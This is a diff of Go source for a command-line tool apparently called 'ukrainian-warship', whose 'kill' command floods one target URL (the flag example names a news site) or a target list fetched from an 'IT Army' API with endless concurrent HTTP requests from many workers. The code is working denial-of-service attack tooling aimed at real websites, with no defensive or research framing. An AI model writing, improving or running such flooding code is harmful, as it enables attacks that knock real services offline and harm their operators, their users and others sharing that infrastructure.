@@ -16,13 +16,17 @@ limitations under the License.
 package cmd
 
 import (
+	"context"
 	"fmt"
+	"os"
+	"os/signal"
+	"sync"
+	"sync/atomic"
 	"time"
 
-	"github.com/seedpockets/ukrainian-warship/pkg/stresstest"
-
+	"github.com/briandowns/spinner"
 	"github.com/seedpockets/ukrainian-warship/pkg/api_client"
-
+	"github.com/seedpockets/ukrainian-warship/pkg/fasttest"
 	"github.com/spf13/cobra"
 )
 
@@ -42,10 +46,7 @@ Default worker amount is 5 per target.`,
 		workers, _ := cmd.Flags().GetInt("workers")
 		refreshRate, _ := cmd.Flags().GetFloat64("refresh")
 		if singleTarget != "" {
-			err := KillSingleTarget(singleTarget, debug)
-			if err != nil {
-				panic(err.Error())
-			}
+			KillSingleTarget(singleTarget, workers, debug)
 		} else {
 			KillAll(workers, refreshRate, debug)
 		}
@@ -54,81 +55,163 @@ Default worker amount is 5 per target.`,
 
 func init() {
 	rootCmd.AddCommand(killCmd)
-	killCmd.Flags().Int("workers", 5, "--workers=1024 set number of workers per target")
 	killCmd.Flags().String("target", "", "--target=https://ww.rt.com takes aim at a single target")
+	killCmd.Flags().Int("workers", 5, "--workers=1024 set number of workers per target")
 	killCmd.Flags().Float64("refresh", 5, "--refresh=10 number of minutes between refreshing target URLs")
 	killCmd.Flags().Bool("debug", false, "--debug=true defaults to false")
 }
 
-func KillSingleTarget(target string, debug bool) error {
-	warship, err := stresstest.New(target, debug, 0)
-	if err != nil {
-		return err
+type total int64
+
+func (c *total) inc() int64 {
+	return atomic.AddInt64((*int64)(c), 1)
+}
+
+func (c *total) get() int64 {
+	return atomic.LoadInt64((*int64)(c))
+}
+
+func KillSingleTarget(target string, workers int, debug bool) {
+	var totalReq total
+	var wg sync.WaitGroup
+	spin := spinner.New(spinner.CharSets[1], 100*time.Millisecond) // Build our new spinner
+	spin.Prefix = fmt.Sprintf("Attacking target: %s ", target)
+	spin.Start()
+	warship := fasttest.New(target)
+	wg.Add(workers) // +1 for the terminal stats printer
+	c1, cancel := context.WithCancel(context.Background())
+	exitCh := make(chan struct{})
+	for i := 0; i < workers; i++ {
+		go func(ctx context.Context) {
+			for {
+				warship.Do()
+				totalReq.inc()
+				select {
+				case <-ctx.Done():
+					fmt.Println("received done, exiting in 50 milliseconds")
+					time.Sleep(50 * time.Millisecond)
+					wg.Done()
+					exitCh <- struct{}{}
+					return
+				default:
+				}
+			}
+		}(c1)
 	}
-	warship.FocusFire()
-	return nil
+	signalCh := make(chan os.Signal, 1)
+	signal.Notify(signalCh, os.Interrupt)
+	go func() {
+		select {
+		case <-signalCh:
+			spin.Stop()
+			cancel()
+			return
+		}
+	}()
+	<-exitCh
+	wg.Wait()
+	fmt.Printf("Target: %s\t\t Total requests: %d\n", target, totalReq)
 }
 
 func KillAll(workers int, refreshRate float64, debug bool) {
-	var refreshTimeMinutes = time.Duration(refreshRate)
-	refreshTime := time.Now().Add(time.Minute * refreshTimeMinutes).Unix() // refresh targets interval
-	running := true
-	warships := []*stresstest.Warship{}
-	var totalRequests int64 = 0
-	for running {
-		if len(warships) <= 0 {
-			targets, err := getTargets()
-			if err != nil {
-				fmt.Println("Could not get targets")
-				panic(err.Error())
-			}
-			for i := 0; i < len(targets.Online); i++ {
-				warship, err := stresstest.New(targets.Online[i], debug, workers)
-				if err != nil {
-					fmt.Println("Failed to start Warship: ", targets.Online[i])
+	targets, err := getTargets()
+	if err != nil {
+		panic(err)
+	}
+	var wg sync.WaitGroup
+	spin := spinner.New(spinner.CharSets[1], 100*time.Millisecond) // Build our new spinner
+	spin.Prefix = "Ukrainian Warship goes brrr.... "
+	spin.Start()
+	armada := make([]*fasttest.Fast, len(targets.Online))
+	for i := 0; i < len(targets.Online); i++ {
+		armada[i] = fasttest.New(targets.Online[i])
+	}
+	wg.Add(workers * len(targets.Online)) // +1 for the terminal stats printer
+	c1, cancel := context.WithCancel(context.Background())
+	exitCh := make(chan struct{})
+	for _, v := range armada {
+		for j := 0; j < workers; j++ {
+			go func(ctx context.Context) {
+				for {
+					v.Do()
+					v.TotalRequests.Inc()
+					select {
+					case <-ctx.Done():
+						time.Sleep(50 * time.Millisecond)
+						wg.Done()
+						exitCh <- struct{}{}
+						return
+					default:
+					}
 				}
-				warship.Fire()
-				warships = append(warships, warship)
-			}
+			}(c1)
 		}
-		clearScreen()
-		fmt.Println(string(colorGreen) + "Updates targets every " + refreshTimeMinutes.String() + " min..." + string(colorReset))
-		fmt.Println("Request\t\tSuccess\t\tTarget")
-		fmt.Println("__________________________________________________________________")
-		for _, v := range warships {
-			fmt.Println(v)
-			totalRequests += v.AmountRequests
+	}
+	signalCh := make(chan os.Signal, 1)
+	signal.Notify(signalCh, os.Interrupt)
+	go func() {
+		select {
+		case <-signalCh:
+			spin.Stop()
+			cancel()
+			return
 		}
-		fmt.Printf("Total Request: %d", totalRequests)
-		if time.Now().Unix() > refreshTime {
-			fmt.Println("Refreshing targets!")
-			warships = []*stresstest.Warship{}
-			refreshTime = time.Now().Add(time.Minute * refreshTimeMinutes).Unix()
-		}
-		time.Sleep(time.Millisecond * 500)
+	}()
+	<-exitCh
+	wg.Wait()
+	for _, v := range armada {
+		fmt.Printf("Total requests: %d\t\tTarget: %s\n", v.TotalRequests, v.URL)
 	}
 }
 
-func getTargets() (*api_client.Targets, error) {
-	fmt.Println("Acquiring targets...")
-	targets := &api_client.Targets{}
-	targets, err := api_client.GetTargets()
+//func KillAll(workers int, refreshRate float64, debug bool) {
+//	var refreshTimeMinutes = time.Duration(refreshRate)
+//	refreshTime := time.Now().Add(time.Minute * refreshTimeMinutes).Unix() // refresh targets interval
+//	running := true
+//	warships := []*stresstest.Warship{}
+//	var totalRequests int64 = 0
+//	for running {
+//		if len(warships) <= 0 {
+//			targets, err := getTargets()
+//			if err != nil {
+//				fmt.Println("Could not get targets")
+//				panic(err.Error())
+//			}
+//			for i := 0; i < len(targets.Online); i++ {
+//				warship, err := stresstest.New(targets.Online[i], debug, workers)
+//				if err != nil {
+//					fmt.Println("Failed to start Warship: ", targets.Online[i])
+//				}
+//				warship.Fire()
+//				warships = append(warships, warship)
+//			}
+//		}
+//		clearScreen()
+//		fmt.Println(string(colorGreen) + "Updates targets every " + refreshTimeMinutes.String() + " min..." + string(colorReset))
+//		fmt.Println("Request\t\tSuccess\t\tTarget")
+//		fmt.Println("__________________________________________________________________")
+//		for _, v := range warships {
+//			fmt.Println(v)
+//			totalRequests += v.AmountRequests
+//		}
+//		fmt.Printf("Total Request: %d", totalRequests)
+//		if time.Now().Unix() > refreshTime {
+//			fmt.Println("Refreshing targets!")
+//			warships = []*stresstest.Warship{}
+//			refreshTime = time.Now().Add(time.Minute * refreshTimeMinutes).Unix()
+//		}
+//		time.Sleep(time.Millisecond * 500)
+//	}
+//}
+
+func getTargets() (*api_client.TargetsItArmy, error) {
+	fmt.Println("Ukrainian Warship Acquiring targets...")
+	targets := &api_client.TargetsItArmy{}
+	targets, err := api_client.GetTargetsItArmyPpUa()
 	if err != nil {
 		return nil, err
 	}
-	if len(targets.Online) <= 0 {
-		haveTargets := false
-		for !haveTargets {
-			targets, err = api_client.GetTargets()
-			if err != nil {
-				return nil, err
-			}
-			if len(targets.Online) > 0 {
-				haveTargets = true
-			}
-		}
-	}
-	fmt.Println("Done...")
+	fmt.Println("Targets acquired...")
 	return targets, nil
 }
 
